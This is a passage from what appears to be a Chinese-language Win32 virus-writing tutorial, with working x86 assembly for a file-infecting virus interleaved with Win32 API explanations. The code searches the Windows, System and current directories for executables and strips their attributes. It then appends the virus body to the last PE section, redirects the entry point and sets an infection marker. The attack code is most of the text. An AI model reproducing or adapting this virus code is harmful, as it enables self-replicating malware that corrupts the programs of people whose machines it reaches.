- ;---------------------------------------------------------------------------  
- ; 首先，我们看看我们是不是在第一次产生病毒，通过检测 EBP 的值是否为 0。如果是，  
- ; 我们跳转到第一次产生的地方。但是，如果它不是，我们先从堆栈中恢复标志寄存器，  
- ; 接下来是所有的寄存器。然后我们的指令是给 EAX 赋感染后的程序旧入口地址(在感染  
- ; 的时候补丁)，然后我们把它加上当前进程(在运行期补丁)的基址，我跳到它那里。  
- ;---------------------------------------------------------------------------  
-  
-PrepareInfection:  
-        lea     edi,\[ebp+WindowsDir\]            ; 指向第一个目录  
-        push    7Fh                             ; 把缓存的大小压栈  
-        push    edi                             ; 把缓存的地址压栈  
-        call    \[ebp+\_GetWindowsDirectoryA\]     ; 获取 windows 目录  
-  
-        add     edi,7Fh                         ; 指向第二个目录  
-        push    7Fh                             ; 把缓存的大小压栈  
-        push    edi                             ; 把缓存的地址压栈  
-        call    \[ebp+\_GetSystemDirectoryA\]      ; 获取 windows\\system 目录  
-  
-        add     edi,7Fh                         ; 指向第三个目录  
-        push    edi                             ; 把缓存的地址压栈  
-        push    7Fh                             ; 把缓存的大小压栈  
-        call    \[ebp+\_GetCurrentDirectoryA\]     ; 获取当前目录  
-        ret  
-  
- ;---------------------------------------------------------------------------  
- ; 这是一个简单的用来获取病毒将要搜索文件来感染的所有目录，并按这个特定顺序。  
- ; 因为一个目录的最大长度是 7F 字节，我已经保存到堆栈(看下面)的三连续变量中，  
- ; 因此避免无用的代码占更多的字节，和随病毒传播无用的数据。请注意在最后一个  
- ; API 中没有任何错误，因为在那个 API 中，顺序改变了。让我们对那个 API 做一个更  
- ; 深的分析：  
- ;   
- ; GetWindowsDirectory 函数得到 Windows 的目录。Windows 目率包含了一些基于 Windows  
- ; 的应用程序，初始化文件，和帮助文件。  
- ;                                                                    
- ; UINT GetWindowsDirectory(                                       
- ;   LPTSTR lpBuffer,    // 保存 Windows 目录的缓存地址     
- ;   UINT uSize  // 目录缓存的大小                            
- ;  );                                                            
- ;                                                
- ; 参数         
- ; ====  
- ; ?lpBuffer: 指向接受 NULL 结尾的包含路径的字符串的缓存。这个路径不是以一个  
- ;   反斜线符号结束的，除非 Windows 目录是根目录。例如，如果 Windows 目录是在 C  
- ;   盘上的以 WINDOWS 命名的，那么这个函数返回的 Windows 目录是 C:\\WINDOWS.如果  
- ;   Windows 是安装在 C 盘的根目录上的，返回的路径是 C:\\。  
- ; ?uSize: 指定被 lpBuffer 参数指向的缓存的字符最大个数。这个值应该设置成至少  
- ;   为 MAS\_PATH 来为路径指定足够的空间。  
- ;                                                                 
- ; 返回值                                         
- ; ======                                           
- ;                                                           
- ; ?如果函数成功执行了，返回值是复制到缓冲区的字符个数，不包括 NULL 结尾符。  
- ; ?如果长度比缓冲区的大小还要大，返回值将是缓冲区所需要保存路径所需要的  
- ;  大小。  
- ;                                  
- ; ---                                      
- ;                                   
- ; GetSystemDirectory 函数得到的是 Windows 系统目录，系统目录包括诸如 Windows 库  
- ; 驱动和字体文件。  
- ;                                                  
- ; UINT GetSystemDirectory(                      
- ;   LPTSTR lpBuffer,    // 保存系统目录的缓冲区  
- ;   UINT uSize  // 目录缓冲区的大小  
- ;  );                                   
- ;                                  
- ;                                
- ; 参数         
- ; ====  
- ;                                          
- ; ?lpBuffer: 指向接受以 NULL 结尾的包含路径的字符串的缓冲区。这个路径不是以一个  
- ;   反斜线符号结尾的，除非系统目录是根目录。例如，如果系统目录是在 C 盘上的名为  
- ;   WINDOWS\\SYSTEM，那么这个函数返回的系统目录路径为 C:\\WINDOWS\\SYSTEM。  
- ;                                        
- ; ?uSize: 指定缓冲区的最大字符个数。这个值应该被设置成最小 MAX\_PATH。  
- ;                      
- ; 返回值             
- ; ======  
- ;                                      
- ; ?如果函数成功了，返回值是复制到缓冲区中的字符个数，不包括 NULL 结尾字符。  
- ;  如果长度大于缓冲区的大小，返回值是保存路径的缓冲区所需要的大小。  
- ;                      
- ; ---                      
- ;                          
- ; GetCurrentDirectory 函数得到的是当前进程的当前目录。  
- ; current process.                               
- ;                          
- ; DWORD GetCurrentDirectory(    
- ;   DWORD nBufferLength,        // 目录缓冲区的字符个数  
- ;   LPTSTR lpBuffer     // 保存当前目录的缓冲区地址  
- ;  );                  
- ;                     
- ; 参数                   
- ; ====  
- ;                                   
- ; ?nBufferLength: 保存当前目录字符串的缓冲区的字符个数。缓冲区的长度必须包括  
- ;   NULL 字符在内。  
- ;                                    
- ; ?lpBuffer: 指向保存当前目录字符串缓冲区的字符串。这个以 NULL 结尾的字符串保存  
- ;   的是当前目录的绝对路径。  
- ;                             
- ; 返回值  
- ; ======  
- ;                                           
- ; ?如果函数成功执行了，返回的值是写到缓冲区的字符个数，不包括 NULL 字符。  
- ;---------------------------------------------------------------------------  
-  
-InfectItAll:  
-        lea     edi,\[ebp+directories\]           ; 指向第一个目录  
-        mov     byte ptr \[ebp+mirrormirror\],03h ; 3 个目录  
-requiem:  
-        push    edi                             ; 设置由 EDI 指向的目录  
-        call    \[ebp+\_SetCurrentDirectoryA\]  
-  
-        push    edi                             ; 保存 EDI  
-        call    Infect                          ; 感染选定的目录的所有文件  
-        pop     edi                             ; 恢复 EDI  
-  
-        add     edi,7Fh                         ; 另外一个目录  
-  
-        dec     byte ptr \[ebp+mirrormirror\]     ; 计数器－1  
-        jnz     requiem                         ; 是最后一个吗？不是，再来  
-        ret  
-  
- ;---------------------------------------------------------------------------  
- ; 我们开始所做的是使 EDI 指向数组中的第一个目录，然后我们设置我们想要感染的目录  
- ; 个数(dirs2inf=3)。好了，然后我们开始主循环。它包括如下:我们改变目录到当前  
- ; 选定的目录下面，我们感染所有那个目录的所有想要感染的文件，然后我们得到了另外  
- ; 一个目录知道我们完成了我们想要感染的 3 个目录。简单，啊？:)该看看 SetCurrentDirectory  
- ; 这个 API 函数的特征了:  
- ;                          
- ; SetCurrentDirectory 为当前进程改变当前目录。  
- ;       
- ; BOOL SetCurrentDirectory(          
- ;   LPCTSTR lpPathName  // 当前新目录的名字地址  
- ;  );          
- ;      
- ; 参数  
- ; ====  
- ;         
- ; ?lpPathName: 指向一个以 NULL 字符结尾的字符串，这个字符串保存当前新目录的  
- ;   名字。这个参数可以是一个相对路径，还可以是绝对路径。在每种情况下，都是  
- ;   计算并保存的当前目录的绝对路径。  
- ;         
- ; 返回值       
- ; ======  
- ;   
- ; ?如果函数成功执行，返回的是非 0 值。  
- ;---------------------------------------------------------------------------  
-  
-Infect: and     dword ptr \[ebp+infections\],00000000h ; reset countah  
-  
-        lea     eax,\[ebp+offset WIN32\_FIND\_DATA\] ; Find's shit structure  
-        push    eax                             ; Push it  
-        lea     eax,\[ebp+offset EXE\_MASK\]       ; Mask to search for  
-        push    eax                             ; Push it  
-  
-        call    \[ebp+\_FindFirstFileA\]           ; Get first matching file  
-  
-        inc     eax                             ; CMP EAX,0FFFFFFFFh  
-        jz      FailInfect                      ; JZ  FAILINFECT  
-        dec     eax  
-  
-        mov     dword ptr \[ebp+SearchHandle\],eax ; Save the Search Handle  
-  
- ;---------------------------------------------------------------------------  
- ; 这是感染例程的第一部分。第一行仅仅是为了用一个更为优化的方法(此例中的 AND  
- ; 比 mov 更小)清除感染计数器(即设置成 0)。在感染计数器已经重置之后，该是搜索  
- ; 文件来感染的时候了;)OK，在 DOS 中，我们有 INT 21h 的 4Eh/4Fh 服务...现在在 Win32  
- ; 中，我们有两个等价的 API 函数:FindFirstFile 和 FindNextFile。现在我们想要  
- ; 搜索目录中的第一个文件。所有的 Win32 中的寻找文件的函数都有一个结构(你还记得  
- ; DTA 吗?)叫做 WIN32\_FIND\_DATA(许多时候简称 WFD)。让我们看看这个结构的域：  
- ;   
- ; MAX\_PATH                equ     260  <-- 路径的最大大小  
- ;   
- ; FILETIME                STRUC        <-- 处理时间的结构，在很多 Win32  
- ; FT\_dwLowDateTime        dd      ?        结构中都有  
- ; FT\_dwHighDateTime       dd      ?     
- ; FILETIME                ENDS     
- ;   
- ; WIN32\_FIND\_DATA         STRUC    
- ; WFD\_dwFileAttributes    dd      ?    <-- 包含了文件的属性  
- ; WFD\_ftCreationTime      FILETIME ?   <-- 文件创建的时间  
- ; WFD\_ftLastAccessTime    FILETIME ?   <-- 文件的最后访问时间  
- ; WFD\_ftLastWriteTime     FILETIME ?   <-- 文件的最后修改时间  
- ; WFD\_nFileSizeHigh       dd      ?    <-- 文件大小的高位  
- ; WFD\_nFileSizeLow        dd      ?    <-- 文件大小的低位  
- ; WFD\_dwReserved0         dd      ?    <-- 保留  
- ; WFD\_dwReserved1         dd      ?    <-- 保留  
- ; WFD\_szFileName          db      MAX\_PATH dup (?) <-- ASCII 形式的文件名  
- ; WFD\_szAlternateFileName db      13 dup (?) <-- 除去路径的文件名  
- ;                         db      03 dup (?) <-- Padding  
- ; WIN32\_FIND\_DATA         ENDS  
- ;  
- ; ?dwFileAttributes: 决定找到的文件的属性。这个成员可以为一个或更多的值\[在  
- ;   这里因为空间关系就不列举了:你可以在 29A 的 INC 文件(29A#2)和以前的文档中找  
- ;   到\]  
- ;  
- ; ?ftCreationTime: 包含了一个 FILETIME 结构包含了文件创建的时间。FindFirstFile  
- ;   和 FindNextFile 以 Coordinated Universal Time (UTC) 格式报告文件的时间。如果  
- ;   文件系统包含的文件不支持这个时间成员的话，这两个函数会把 FILETIME 的成员设   
- ;   置成 0。你可以使用 FileTimeToLocalFileTime 函数来把 UTC 转化成本机时间，然后  
- ;   使用 FileTimeToSystemTime 函数把本机时间转化成一个 SYSTEMTIME 结构的包含月，  
- ;   日，年，星期，小时，分，秒，和毫秒。  
- ;     
- ; ?ftLastAccessTime: 保存了一个 FILETIME 结构，包含了文件最后访问的时间。这个  
- ;   时间是 UTC 形式;如果文件系统不支持这个时间成员，FILETIME 的成员就是 0。  
- ;  
- ; ?ftLastWriteTime: 保存了一个 FILETIME 结构包含了文件的最后修改时间。时间是  
- ;   UTC 格式的；如果文件系统不支持这个时间成员，FILETIME 的成员就是 0。  
- ;  
- ; ?nFileSizeHigh: 保存了 DWORD 类型的文件大小的高位。如果文件大小比 MAXDWORD 大  
- ;   的话，这个值为 0。文件的大小等于(nFileSizeHigh \* MAXDWORD)+ nFileSizeLow。  
- ;  
- ; ?nFileSizeLow: 保存了 DWORD 类型的文件大小的低位。  
- ;  
- ; ?dwReserved0: 保留为将来使用。  
- ;  
- ; ?dwReserved1: 保留为将来使用。  
- ;  
- ; ?cFileName: 一个 NULL 字符结尾的字符串是文件的名字。  
- ;  
- ; ?cAlternateFileName: 一个以 NULL 结尾的字符串保存的是文件的可选名。这个名字  
- ; 是古典的 8.3(filename.ext)文件名格式。  
- ;  
- ; 当我们知道了 WFD 结构的域之后，我们可以更深一层地去"寻找"Windows 地函数。首先  
- ; 让我们来看看 FindFirstFileA 这个 API 地描述：  
- ;  
- ; FindFirstFile 函数在一个目录中搜索一个和指定地文件名符合的文件。FindFirstFileA  
- ; 还检查子目录名。  
- ;   
- ; HANDLE FindFirstFile(  
- ;   LPCTSTR lpFileName,  // 指向要搜索的文件名  
- ;   LPWIN32\_FIND\_DATA lpFindFileData    // 指向返回信息  
- ;  );  
- ;  
- ; 参数  
- ; ====  
- ;  
- ; ?lpFileName:  A. Windows 95: 指向一个以 NULL 结尾的指定一个合法的目录或路径和  
- ;                  文件名字符串，它可以包含通配符(\*和?)。这个字符串不能超过  
- ;                  MAX\_PATH 个数。  
- ;                    
- ;               B. Windows NT: 指向一个以 NULL 结尾的指定一个合法的目录或路径和  
- ;                  文件名字符串，它不能包含通配符(\*和?)。  
- ;                         
- ; 路径有一个缺省的字符大小限制 MAX\_PATH。这个限制取决于 FindFirst 函数怎么分析路径。  
- ; 一个应用程序可以超过这个限制并可以通过调用宽(W)版本的 FindFirstFile 函数并预先考虑  
- ; "\\\\?\\"来传给超过 MAX\_PATH 的路径。"\\\\?\\"告诉了函数关闭路径解析；它使得路径长于 MAX\_PATH  
- ; 可以被 FindFirstFileW 函数使用。这个还可以对 UNC 名有效。"\\\\?\\"被作为路径的一部分  
- ; 忽略掉了。例如，"\\\\?\\C:\\myworld\\private"被看成"C:\\myworld\\private", 而  
- ; "\\\\?\\UNC\\bill\_g\_1\\hotstuff\\coolapps"被看成"\\\\bill\_g\_1\\hotstuff\\coolapps"。  
- ;                                            
- ; ?lpFindFileData: 指向于 WIN32\_FIND\_DATA 结构来接受关于找到的文件或目录。这个  
- ;   结构可以在随后的调用 FindNextFile 或 FindClose 函数中引用文件或子目录。  
- ;                                                                  
- ; 返回值                                                     
- ; =====                                      
- ;                                          
- ; ?如果函数成功调用了，返回值是一个搜索句柄，在随后的调用 FindNextFile 或 FindClose  
- ;   时用到。  
- ;                                                                           
- ; ?如果函数失败了，返回值是 INVALID\_HANDLE\_VALUE。为了获得详细的错误信息，调用  
- ;   函数。  
- ;                                                                            
- ; 所以，现在你知道了 FindFirstFile 函数的所有参数了。而且，现在你知道了下面代码块  
- ; 的最后一行了:)  
- ;---------------------------------------------------------------------------  
-  
-\_\_1:    push    dword ptr \[ebp+OldEIP\]          ; 保存 OldEIP 和 ModBase,  
-        push    dword ptr \[ebp+ModBase\]         ; 感染时改变  
-  
-        call    Infection                       ; 感染找到的文件  
-  
-        pop     dword ptr \[ebp+ModBase\]         ; 恢复它们  
-        pop     dword ptr \[ebp+OldEIP\]  
-  
-        inc     byte ptr \[ebp+infections\]       ; 增加计数器  
-        cmp     byte ptr \[ebp+infections\],05h   ; 超过限制啦?  
-        jz      FailInfect                      ; 该死...  
-  
- ;---------------------------------------------------------------------------  
- ; 我们所做的第一件事是保存了一些必须的变量的内容，它们在后面我们返回控制权给主体的  
- ; 时候用到，但是这些变量在感染文件的时候改变了是很痛苦的。我们调用感染例程：它仅  
- ; 需要 WFD 信息，所以我们不必给它传参数了。在感染完相关的文件后，我们把值再改回来。  
- ; 在做完那个以后，我们增加感染计数器，并检查我们是否已经感染了 5 个文件了(这个病毒  
- ; 的感染限制)。如果我们已经做完了那些事情，病毒从感染函数中退出。  
- ;---------------------------------------------------------------------------  
-  
-\_\_2:    lea     edi,\[ebp+WFD\_szFileName\]        ; 指向文件名的指针  
-        mov     ecx,MAX\_PATH                    ; ECX = 260  
-        xor     al,al                           ; AL = 00  
-        rep     stosb                           ; 清除旧的文件名变量  
-  
-        lea     eax,\[ebp+offset WIN32\_FIND\_DATA\] ; 指向 WFD 的指针  
-        push    eax                             ; 把它压栈  
-        push    dword ptr \[ebp+SearchHandle\]    ; Push Search Handle  
-        call    \[ebp+\_FindNextFileA\]            ; 寻找另外一个文件  
-  
-        or      eax,eax                         ; 失败?   
-        jnz     \_\_1                             ; 没有, 感染另外一个  
-  
-CloseSearchHandle:  
-        push    dword ptr \[ebp+SearchHandle\]    ; Push search handle  
-        call    \[ebp+\_FindClose\]                ; 关闭它  
-  
-FailInfect:  
-        ret  
-  
- ;---------------------------------------------------------------------------  
- ; 代码块的开始部分做一个简单的事情：它抹掉在 WFD 结构(校验文件名数据)里的数据。  
- ; 这样做是为了在寻找另外一个文件的时候避免出问题。我们下一步要做的是调用  
- ; FindNextFile 这个 API 函数。下面是这个 API 的描述:  
- ;                                              
- ; FindNextFile 函数继续以前调用的 FindFirstFile 函数来继续搜索一个文件 。  
- ;                                                                            
- ; BOOL FindNextFile(                                                         
- ;   HANDLE hFindFile,   // 要搜索的句柄                                  
- ;   LPWIN32\_FIND\_DATA lpFindFileData    // 指向保存找到文件的数据的结构  
- ;  );                                                                        
- ;                                                                            
- ; 参数                                                                 
- ; ====                                                                 
- ;                                                                            
- ; ?hFindFile: 识别由先前的调用 FindFirstFile 函数返回的搜索句柄。  
- ;                                                                            
- ; ?lpFindFileData: 指向一个 WIN32\_FIND\_DATA 结构，用来接受关于找到的文件或子目录  
- ;   的信息。这个结构可以在随后的调用 FindNextFile 时引用来寻找文件或目录。  
- ;                                                                            
- ; 返回值                                                            
- ; ======                                                             
- ;                                                                            
- ; ?如果函数调用成功，返回值是非零值。                   
- ;                                                                            
- ; ?如果函数调用成功，返回值是 0。为了获得详细的错误信息，调用 GetLastError。  
- ;                                                          
- ; ?如果没有匹配的文件，GetLastError 函数会返回 ERROR\_NO\_MORE\_FILES。  
- ;                                                                         
- ; 如果 FindNextFile 返回错误，或者如果病毒已经到达了可能感染的最大文件数，我们到了  
- ; 这个例程的最后一块。它由通过 FindClose 这个 API 来关闭搜索句柄组成。照常，下面是  
- ; 这个 API 的描述:  
- ;                                                                            
- ; FindClose 函数关闭指定的搜索句柄。FindFirstFile 和 FindNextFile 函数使用这个   
- ; 句柄来用匹配给定的名字来定位文件。  
- ;                                                                            
- ; BOOL FindClose(                                                            
- ;   HANDLE hFindFile    // 文件搜索句柄  
- ;  );                                                            
- ;                                                  
- ;                                                   
- ; 参数  
- ; ====  
- ;                                                        
- ; ?hFindFile: 识别搜索句柄。这个句柄必须是由 FindFirstFile 函数已经打开的。  
- ;                                                                 
- ; 返回值  
- ; ======  
- ;                                              
- ; ?如果函数调用成功，返回值是非 0 值。  
- ;                                                           
- ; ?如果函数调用失败，返回值是 0。为了获得详细的错误信息，调用 GetLastError  
- ;                                                                          ;  
- ;---------------------------------------------------------------------------  
-  
-Infection:  
-        lea     esi,\[ebp+WFD\_szFileName\]        ; 获得要感染的文件名  
-        push    80h  
-        push    esi  
-        call    \[ebp+\_SetFileAttributesA\]       ; 清除它的属性  
-  
-        call    OpenFile                        ; 打开它  
-  
-        inc     eax                             ; 如果 EAX = -1, 就有一个错误  
-        jz      CantOpen                          
-        dec     eax  
-  
-        mov     dword ptr \[ebp+FileHandle\],eax  
-  
- ;---------------------------------------------------------------------------  
- ; 我们首先做的是清除文件的属性，并把它们设置为"正常文件"。这是通过 SetFileAttributes  
- ; 这个 API 来实现的。下面给出这个 API 的简要介绍：  
- ;                                                                  
- ; SetFileAttributes 函数 设置一个文件的属性。          
- ;                                                                           
- ; BOOL SetFileAttributes(                                             
- ;   LPCTSTR lpFileName, // 文件名的地址  
- ;   DWORD dwFileAttributes      // 要设置的属性的地址  
- ;  );                                                            
- ;                                                         
- ; 参数  
- ; ====  
- ;                                                                     
- ; ?lpFileName: 指向一个保存要修改属性的文件的文件名字符串。  
- ;                                                                            
- ; ?dwFileAttributes: 指定要设置的文件的属性。这个参数可以为下面的值的组合。然而，  
- ;   所有的其它的值超越 FILE\_ATTRIBUTE\_NORMAL  
- ;                                                                   
- ; 返回值  
- ; ======  
- ;                                                                     
- ; ?如果函数调用成功，返回值是非 0 值。  
- ;                                                                            
- ; ?如果函数调用失败，返回值是 0。为了获得详细的错误信息，调用 GetLastError  
- ;                                                                            
- ; 在我们设置了新的文件属性之后，我们打开了文件，而且，如果没有任何错误发生，它把  
- ; 句柄保存到它的变量中。  
- ;---------------------------------------------------------------------------  
-  
-        mov     ecx,dword ptr \[ebp+WFD\_nFileSizeLow\] ; 首先我们用它的正确大小创建映射  
-        call    CreateMap                       
-  
-        or      eax,eax  
-        jz      CloseFile  
-  
-        mov     dword ptr \[ebp+MapHandle\],eax  
-  
-        mov     ecx,dword ptr \[ebp+WFD\_nFileSizeLow\]   
-        call    MapFile                         ; 映射它  
-  
-        or      eax,eax  
-        jz      UnMapFile  
-  
-        mov     dword ptr \[ebp+MapAddress\],eax  
-  
- ;---------------------------------------------------------------------------  
- ; 首先我们给 ECX 赋我们打算要映射的文件的大小，然后我们调用我们的函数来映射它。  
- ; 我们检查可能的错误，如果没有任何错误，我们继续，否则，我们关闭文件。然后我们  
- ; 保存映射句柄，并准备最终利用 MapFile 函数来映射它。还象以前那样，我们检查错误，  
- ; 决定相应的处理。如果所有的都做好了，我们保存映射起作用的地址。  
- ;---------------------------------------------------------------------------  
-  
-        mov     esi,\[eax+3Ch\]  
-        add     esi,eax  
-        cmp     dword ptr \[esi\],"EP"            ; 它是 PE 吗?  
-        jnz     NoInfect  
-  
-        cmp     dword ptr \[esi+4Ch\],"CTZA"     ; 它被感染了吗?  
-        jz      NoInfect  
-  
-        push    dword ptr \[esi+3Ch\]  
-  
-        push    dword ptr \[ebp+MapAddress\]      ; 关闭所有  
-        call    \[ebp+\_UnmapViewOfFile\]  
-  
-        push    dword ptr \[ebp+MapHandle\]  
-        call    \[ebp+\_CloseHandle\]  
-  
-        pop     ecx  
-  
- ;---------------------------------------------------------------------------  
- ; 当我们在 EAX 中得到了开始映射的地址，我们刷新指向 PE 头(MapAddress+3Ch)的指针，    
- ; 然后我们规范化它，所以在 ESI 中我们将得到指向 PE 头的指针。总之我们检查它是否 OK，  
- ; 所以我们检查 PE 签名。在那个检查之后，我们检查文件是否在以前感染过了(我们在 PE 的  
- ; 偏移地址 4Ch 处保存了一个标记，程序从来不会用的)，如果它没有，我们继续感染过程。  
- ; 我们保存他们，在堆栈中 ，文件对齐(看看 PE 头那一章)。而且在那之后，我们解除映射，  
- ; 并关闭映射句柄。最终我们从堆栈恢复文件对齐(File Alignment)，把它存在 ECX 寄存器中。  
- ;---------------------------------------------------------------------------  
-  
-        mov     eax,dword ptr \[ebp+WFD\_nFileSizeLow\] ; 再次映射  
-        add     eax,virus\_size  
-  
-        call    Align  
-        xchg    ecx,eax  
-  
-        call    CreateMap  
-        or      eax,eax  
-        jz      CloseFile  
-  
-        mov     dword ptr \[ebp+MapHandle\],eax  
-  
-        mov     ecx,dword ptr \[ebp+NewSize\]  
-        call    MapFile  
-  
-        or      eax,eax  
-        jz      UnMapFile  
-  
-        mov     dword ptr \[ebp+MapAddress\],eax  
-          
-        mov     esi,\[eax+3Ch\]  
-        add     esi,eax  
-  
- ;---------------------------------------------------------------------------  
- ; 当我们在 ECX(准备'Align'函数，因为它需要在 ECX 中的对齐因子)中得到了文件对齐，我们  
- ; 给 EAX 赋打开的文件大小加上病毒大小(EAX 是要对齐的数量)，然后我们调用'Align'函数，  
- ; 它在 EAX 中返回给我们对齐的数字。例如，如果对齐(Alignment)是 200h，而且文件大小+  
- ; 病毒大小是 12345h，'Align'函数将会返回给我们的数字将会是 12400h。然后我们把对齐数字  
- ; 保存到 ECX 中。我们再次调用 CreateMap 函数，但是现在我们用对齐后的大小来映射文件。  
- ; 在这之后，我们再次使 ESI 指向 PE 头。  
- ;---------------------------------------------------------------------------  
-  
-        mov     edi,esi                         ; EDI = ESI = Ptr to PE header  
-  
-        movzx   eax,word ptr \[edi+06h\]          ; AX = n?of sections  
-        dec     eax                             ; AX\--  
-        imul    eax,eax,28h                     ; EAX = AX\*28  
-        add     esi,eax                         ; Normalize  
-        add     esi,78h                         ; Ptr to dir table  
-        mov     edx,\[edi+74h\]                   ; EDX = n?of dir entries  
-        shl     edx,3                           ; EDX = EDX\*8  
-        add     esi,edx                         ; ESI = Ptr to last section  
-  
- ;---------------------------------------------------------------------------  
- ; 首先我们也使 EDI 指向 PE 头。然后，我们给 AX 赋节的个数(一个 WORD 类型的数)，并使它  
- ; 减 1。然后我们把 AX(n,节数-1)乘以 28h(节头的大小)，把它再加上 PE 头的偏移地址。使 ESI  
- ; 指向目录表，在 EDX 中得到目录入口点的数目。然后我们把它乘以 8，最后把结果(在 EDX 中)  
- ; 加到 ESI，所以 ESI 将指到最后一节。  
- ;---------------------------------------------------------------------------  
-  
-        mov     eax,\[edi+28h\]                   ; 获得 EP  
-        mov     dword ptr \[ebp+OldEIP\],eax      ; 保存它  
-        mov     eax,\[edi+34h\]                   ; 获得 imagebase  
-        mov     dword ptr \[ebp+ModBase\],eax     ; 保存它  
-          
-        mov     edx,\[esi+10h\]                   ; EDX = SizeOfRawData  
-        mov     ebx,edx                         ; EBX = EDX  
-        add     edx,\[esi+14h\]                   ; EDX = EDX+PointerToRawData  
-  
-        push    edx                             ; 保存 EDX  
-  
-        mov     eax,ebx                         ; EAX = EBX  
-        add     eax,\[esi+0Ch\]                   ; EAX = EAX+VA 地址  
-                                                ; EAX = 新 EIP  
-        mov     \[edi+28h\],eax                   ; 改变新的 EIP  
-        mov     dword ptr \[ebp+NewEIP\],eax      ; 还保存它  
-  
- ;---------------------------------------------------------------------------  
- ; 首先我们给 EAX 赋我们正在感染的文件的 EIP 值，为了后面把旧 EIP 赋给一个变量，将会在  
- ; 病毒(你将会看到)的开始用到。我们对基址同样这么做。然后，我们给 EDX 赋最后一节的  
- ; 的 SizeOfRawData 赋给 EDX，再赋给 EDX，然后，我们把 EDX 加上 PointerToRawData(EDX  
- ; 将在复制病毒的时候用到所以我们把它保存到堆栈中)。在这之后，我们给 EAX 赋 SizeOfRawData，  
- ; 把它加上 VA 地址 :所以我们在 EAX 中得到的是主体的新 EIP。所以我们把它保存在它的 PE 头  
- ; 的域中，并保存在另外一个变量中(看看病毒的开始处)。  
- ;---------------------------------------------------------------------------  
-  
-        mov     eax,\[esi+10h\]                   ; EAX = 新的 SizeOfRawData  
-        add     eax,virus\_size                  ; EAX = EAX+VirusSize  
-        mov     ecx,\[edi+3Ch\]                   ; ECX = FileAlignment(文件对齐)  
-        call    Align                           ; 对齐!  
-  
-        mov     \[esi+10h\],eax                   ; 新的 SizeOfRawData  
-        mov     \[esi+08h\],eax                   ; 新的 VirtualSize  
-  
-        pop     edx                             ; EDX = 指向节尾的原始指针  
-                                                 
-  
-        mov     eax,\[esi+10h\]                   ; EAX =  新的 SizeOfRawData  
-        add     eax,\[esi+0Ch\]                   ; EAX = EAX+VirtualAddress  
-        mov     \[edi+50h\],eax                   ; EAX =  新的 SizeOfImage  
-  
-        or      dword ptr \[esi+24h\],0A0000020h  ; 设置新的节标志  
-  
-  
- ;---------------------------------------------------------------------------  
- ; Ok, 我们做的第一件事是把最后一节的 SizeOfRawData 装载到 EAX 中，然后把病毒的大小  
- ; 加上它。在 ECX 中，我们装载 FileAlignment，我们调用'Align'函数，所以在 EAX 中，  
- ; 我们将得到对齐后的 SizeOfRawData+VirusSize。  
- ; 让我们看看一个小例子:                                       
- ;                                                                            
- ;      SizeOfRawData - 1234h                                                 
- ;      VirusSize     -  400h                                                 
- ;      FileAlignment -  200h                                                 
- ;                                                                            
- ; 所以，SizeOfRawData + VirusSize 将为 1634，在对那个值对齐之后将为 1800h。简单，哈?   
- ; 所以我们把对齐后的值设为新的 SizeOfRawData 并作为新的 VirtualSize，这样做之后我们  
- ; 将没有问题了，我们计算新的 SizeOfImage，也就是说，新的 SizeOfRawData 和 VirtualAddress  
- ; 的和。在计算完这个之后，我们把它保存到 PE 头的 SizeOfImage 域中(偏移 50h 处)。然后，  
- ; 我们按如下设置节的属性:  
- ;                                                                           
- ;      00000020h - 节包含代码                                 
- ;      40000000h - 节可读  
- ;      80000000h - 节可写                  
- ;                                                   
- ; 所以，如果我们要应用这三个属性只要把那 3 个值或（OR）即可，结果将是 A0000020h。  
- ; 所以，我们还要把他和节的当前属性值进行或，这样我们不必删除旧的：只要加上它们。  
- ;---------------------------------------------------------------------------  
-  
-        mov     dword ptr \[edi+4Ch\],"CTZA"      ; 设置感染标志  
-  
-        lea     esi,\[ebp+aztec\]                 ; ESI = 指向 virus\_start 的指针  
-        xchg    edi,edx                         ; EDI = 指向最后一节结尾的指针  
-                                                ;         
-        add     edi,dword ptr \[ebp+MapAddress\]  ; EDI = 规范化后指针  
-        mov     ecx,virus\_size                  ; ECX = 要复制的大小  
-        rep     movsb                           ; 做它!  
-  
-        jmp     UnMapFile                       ; 解除映射, 关闭, 等等.  
-  
- ;---------------------------------------------------------------------------  
- ; 为了避免重复感染文件我们现在所做的首先是在 PE 头没有用过地方设置感染的标志(偏移  
- ; 4Ch 是保留的)。然后，在 ESI 中放一个指向病毒开始的指针。在我们把 EDX 的值赋给 ESI  
- ; (记住：EDX=旧的 SizeOfRawData+PointerToRawData)之后，那就是我们放置病毒代码  
- ; 的 RVA。正如我已经说过了，它是一个 RVA，这一点你必须知道;)RVA 必须转换成 VA，  
- ; 这是通过把 RVA 加上相对值实现的... 所以，它和开始映射文件的地址(如果你还记得，它是  
- ; 由 MapViewOfFile 这个 API 返回的)相关。所以，最后，在 EDI 中我们得到的是写病毒代码的  
- ; VA。在 ECX 中，我们装入病毒的大小，并复制。所有都做好了!:)现在我们关闭所有...  
- ;---------------------------------------------------------------------------  
-  
-NoInfect:  
-        dec     byte ptr \[ebp+infections\]  
-        mov     ecx,dword ptr \[ebp+WFD\_nFileSizeLow\]  
-        call    TruncFile  
-  
- ;---------------------------------------------------------------------------  
- ; 在感染的时候，如果有什么错误发生，我们就到了这个地方。我们把感染计数器减 1，把文件  
- ; 截去感染之前的大小。我希望我们的病毒不会到达这个地方:)  
- ;---------------------------------------------------------------------------  
-  
-UnMapFile:  
-        push    dword ptr \[ebp+MapAddress\]      ; 关闭映射的地址  
-        call    \[ebp+\_UnmapViewOfFile\]  
-  
-CloseMap:         
-        push    dword ptr \[ebp+MapHandle\]       ; 关闭映射  
-        call    \[ebp+\_CloseHandle\]  
-  
-CloseFile:  
-        push    dword ptr \[ebp+FileHandle\]      ; 关闭文件  
-        call    \[ebp+\_CloseHandle\]  
-  
-CantOpen:  
-        push    dword ptr \[ebp+WFD\_dwFileAttributes\]  
-        lea     eax,\[ebp+WFD\_szFileName\]        ; 设置原先文件的的属性  
-        push    eax  
-        call    \[ebp+\_SetFileAttributesA\]  
-        ret  
-  
- ;---------------------------------------------------------------------------  
- ; 这块代码集中于关闭在感染的时候打开的所有东西：映射地址，映射自身，文件，随后把  
- ; 原先的属性设置回去。  
- ; 让我们看看这里用到的 API：  
- ;                                                                            
- ; UnmapViewOfFile 函数从调用进程的地址空间中解除文件的映射。  
- ;                                                                            
- ; BOOL UnmapViewOfFile(                                                      
- ;   LPCVOID lpBaseAddress       // 开始映射的地址  
- ;  );                                                         
- ;                                                             
- ; 参数                                         
- ; ====                                                                 
- ;                                                                            
- ; ?lpBaseAddress: 指向要解除映射的文件的基址。这个值必须是由先前调用 MapViewOfFile  
